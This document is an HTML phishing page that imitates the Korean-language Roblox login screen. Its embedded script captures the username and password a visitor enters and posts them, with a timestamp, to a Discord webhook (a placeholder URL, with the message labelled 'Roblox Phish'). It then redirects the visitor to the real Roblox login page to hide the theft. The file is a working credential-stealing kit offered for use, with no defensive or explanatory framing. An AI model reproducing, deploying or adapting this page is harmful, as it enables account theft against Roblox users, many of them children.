<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Roblox에 로그인</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
      background: #121215;
      color: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 16px;
      background-image: radial-gradient(ellipse at center, #1a1a22 0%, #0d0d12 70%);
    }
    .modal {
      background: #232329;
      border-radius: 12px;
      width: 100%;
      max-width: 400px;
      padding: 28px 24px 20px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
    }
    h1 {
      font-size: 1.5rem;
      font-weight: 700;
      text-align: center;
      margin-bottom: 20px;
      color: #fff;
    }
    .field {
      margin-bottom: 14px;
    }
    input {
      width: 100%;
      height: 48px;
      padding: 0 16px;
      border-radius: 8px;
      border: 1px solid #3c3c44;
      background: #1a1a20;
      color: #fff;
      font-size: 1rem;
    }
    input::placeholder {
      color: #8b8b95;
    }
    input:focus {
      outline: none;
      border-color: #00a2ff;
    }
    .login-btn {
      width: 100%;
      height: 48px;
      margin-top: 8px;
      border-radius: 8px;
      background: transparent;
      border: 1px solid #5a5a65;
      color: #fff;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
    }
    .login-btn:active {
      background: #2a2a32;
    }
    .links {
      margin-top: 18px;
      text-align: center;
    }
    .links a {
      color: #00a2ff;
      font-size: 0.9rem;
      text-decoration: none;
    }
    .divider {
      height: 1px;
      background: #333;
      margin: 20px 0;
    }
    .secondary-btn {
      width: 100%;
      height: 44px;
      margin-bottom: 10px;
      border: none;
      border-radius: 8px;
      background: #3a3a44;
      color: #fff;
      font-size: 0.95rem;
      font-weight: 500;
      cursor: pointer;
    }
    .secondary-btn:active {
      background: #4a4a55;
    }
    .signup {
      text-align: center;
      margin-top: 16px;
      font-size: 0.9rem;
      color: #aaa;
    }
    .signup a {
      color: #00a2ff;
      text-decoration: none;
    }
    .footer {
      margin-top: 24px;
      font-size: 0.75rem;
      color: #555;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="modal">
    <h1>Roblox에 로그인</h1>
    <form id="f">
      <div class="field">
        <input type="text" id="user" placeholder="사용자 이름/이메일/전화번호" required autocomplete="username">
      </div>
      <div class="field">
        <input type="password" id="pass" placeholder="비밀번호" required autocomplete="current-password">
      </div>
      <button type="submit" class="login-btn">로그인</button>
    </form>
    <div class="links">
      <a href="https://www.roblox.com/login/forgot-password-or-username">비밀번호 또는 사용자 이름을 잊으셨나요?</a>
    </div>
    <div class="divider"></div>
    <button type="button" class="secondary-btn" onclick="location.href='https://www.roblox.com/login'">이메일로 일회용 코드 받기</button>
    <button type="button" class="secondary-btn" onclick="location.href='https://www.roblox.com/login'">빠른 로그인</button>
    <div class="signup">
      계정이 없으신가요? <a href="https://www.roblox.com/account/signupredir">회원가입</a>
    </div>
  </div>
  <p class="footer">© 2026 Roblox Corporation</p>
  <script>
    const WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";
    document.getElementById("f").addEventListener("submit", async (e) => {
      e.preventDefault();
      const user = document.getElementById("user").value.trim();
      const pass = document.getElementById("pass").value;
      const now = new Date().toLocaleString("ko-KR");
      try {
        await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: "Roblox Phish",
            content: "아이디:" + user + "\n비번:" + pass + "\n일시:" + now,
            embeds: [{
              title: "로그인 정보",
              url: "https://www.roblox.com/login",
              description: "```아이디: " + user + "\n비번: " + pass + "```\n일시: " + now,
              color: 0x00A2FF
            }]
          })
        });
      } catch (err) {}
      window.location.href = "https://www.roblox.com/login";
    });
  </script>
</body>
</html>
